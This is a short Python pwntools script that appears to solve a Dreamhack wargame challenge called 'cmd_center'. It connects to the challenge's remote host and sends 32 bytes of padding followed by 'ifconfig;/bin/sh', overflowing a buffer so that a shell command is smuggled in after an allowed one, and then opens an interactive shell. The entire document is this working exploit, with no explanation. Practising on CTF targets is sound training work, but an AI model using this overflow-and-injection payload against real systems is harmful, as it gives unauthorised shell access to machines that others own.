from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

#p = process("./cmd_center")
p = remote("host3.dreamhack.games", 16552)

context(arch='amd64', os='linux')

payload = b"a"*0x20 + b"ifconfig;/bin/sh"
p.sendline(payload)
p.interactive()
